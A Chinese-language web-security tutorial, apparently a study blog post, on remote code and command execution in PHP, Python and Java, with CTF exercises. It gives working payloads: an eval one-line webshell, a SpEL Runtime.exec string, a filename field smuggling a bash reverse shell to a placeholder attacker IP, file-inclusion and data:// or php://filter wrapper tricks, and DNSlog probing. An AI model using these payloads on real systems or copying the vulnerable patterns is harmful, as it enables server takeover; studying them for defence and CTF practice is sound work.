---
title: RCE&代码执行&命令执行&无回显方案&功能点&引发链&黑盒功能点&白盒审计
published: 2026-07-09T12:00:00
description: RCE包含代码执行与命令执行两类高危漏洞：代码执行针对脚本解释器（如eval），命令执行直接调用系统指令（如system），两者可相互转化。常由文件上传、包含、SQL注入等漏洞链触发，利用手法包括有/无回显处理及通配符、伪协议绕过等等。
tags:
  - Web攻防
  - RCE
  - 代码执行
  - 命令执行
category: 网络安全
draft: false
---

# 知识点

1. WEB攻防-RCE -代码执行&命令执行&无回显
2. WEB攻防-RCE-功能点&引发链
3. WEB攻防-RCE-黑盒案例&白盒审计&CTF

```
漏洞函数：
1.PHP：
PHP代码执行函数：
eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()、等

PHP命令执行函数：
system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()、等

2.Python：
eval exec subprocess os.system commands等

3.Java：
Java中没有类似php中eval函数这种直接可以将字符串转化为代码执行的函数，但是有反射机制，并且有各种基于反射机制的表达式引擎，如: OGNL、SpEL、MVEL等.
```

# 思考

# 从命令执行到代码执行

当你通过命令执行漏洞，在目标服务器上运行一些命令，这些命令本身就是在执行代码。例如，用 `php -r "..."` 运行PHP代码，或用 `python -c "..."` 运行Python代码。这样你就成功地在命令执行的基础上，实现了代码执行。

# 从代码执行到命令执行

很多编程语言都提供了调用系统命令的函数。当你通过代码执行漏洞，运行了类似 `system("whoami")`或 `os.system("ls")`的代码，你就实现了从代码执行到命令执行的调用。

# 漏洞利用的“组合拳”

- **通过代码执行获得命令执行能力**：比如，攻击者发现一个PHP的代码执行漏洞，会写入一句话木马（`eval($_POST['cmd'])`），然后通过这个木马执行任意系统命令。
    
- **通过命令执行获得代码执行能力**：又比如，攻击者先利用命令执行漏洞上传一个Webshell文件，然后用蚁剑等工具连接，这个工具本质上就是通过代码执行漏洞来操作服务器的。

# RCE-代码执行

**RCE代码执行：引用脚本代码解析执行**

功能点举例：在线编程

解析脚本代码比如：

```
eval($_GET['code'])
```

url中:`http://xxx:xx/xx?code=phpinfo();`或者转而变成代码调用命令执行：`http://xxx:xx/xx?code=system('calc');`

# RCE-命令执行

**RCE命令执行：脚本调用操作系统命令**

功能点举例：系统面板

执行系统命令比如：

```
$cmd = $_GET['c']
system($cmd)
```

url中:`http://xxx:xx/xx?c=ping 127.0.0.1 && whoami;`

# RCE-Java&PHP

## SPEL

功能点举例：评论解析

用户输入的传参被当作代码解析

payload

```
comment=T(java.lang.Runtime).getRuntime().exec('calc')
```

# 其他漏洞引发链

注入，文件包含，文件上传，反序列化等引发

## 文件上传触发RCE

假设后端存在这样一段极度危险的PHP代码（调用操作系统命令来移动文件）：

```
// 获取上传文件的临时路径和用户自定义的文件名
$tmp_name = $_FILES['file']['tmp_name'];
$file_name = $_GET['filename']; // 或 $_POST['filename']

// 危险操作：直接拼接字符串调用系统 mv 命令
system("mv " . $tmp_name . " " . "/uploads/" . $file_name);
```

你正常上传一个纯文本 `1.txt`（内容写 `hello world`），但在抓包时，将 `filename` 参数改为：

```
POST /upload.php HTTP/1.1
...
filename=1.txt; bash -c 'bash -i >& /dev/tcp/你的IP/4444 0>&1'
```

**后端实际执行的系统命令变成了**：

```
mv /tmp/phpXXXXXX /uploads/1.txt; bash -c 'bash -i >& /dev/tcp/你的IP/4444 0>&1'
```

由于分号 `;` 在Shell中是命令分隔符，操作系统会先执行 `mv`（成功移动文本文件），然后**立即执行后面的 `bash` 反弹Shell**。此时，攻击者直接拿到了服务器的系统权限。**你上传的1.txt里没有任何木马或命令，全是正常文本，但RCE已经发生了。**

## 文件包含配合文件上传触发RCE

上传一个1.txt，代码如下：

```
<?php eval($_GET['x']);?>
```

假设网站有个test.php允许用户通过参数加载不同的页面模板等功能，代码中刚好出现文件包含部分代码，如下：

```
$file = $_GET['file'];

include($file);
```

环境是上传的1.txt与代码在同一级目录下，url访问：`http://xxx:xx/test.php?file=1.txt&x=phpinfo();`

# 有回显&无回显

## 无回显

### 直接写个文件访问查看

```
echo 123>123.txt
// 之后在url进行访问查看是不是真的生成了这个文件
```

### 直接进行对外访问接受

```
ping dnslog的地址
```

# 黑盒案例

代码在线运行平台测试

# 白盒CTF

## 29-通配符

```
system('tac fla*.php');
```

## 30-取代函数&通配符&管道符

```
`cp fla*.ph* 2.txt`;

echo shell_exec('tac fla*.ph*');
```

## 31-参数逃逸

```
eval($_GET[1]);&1=system('tac flag.php');
```

## 32~36-配合包含&伪协议

```
include$_GET[a]?>&a=data://text/plain,<?=system('tac flag.php');?>

include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```

## 37~39-包含RCE&伪协议&通配符

```
data://text/plain,<?php system('tac fla*');?>

php://input post:<?php system('tac flag.php');?>
```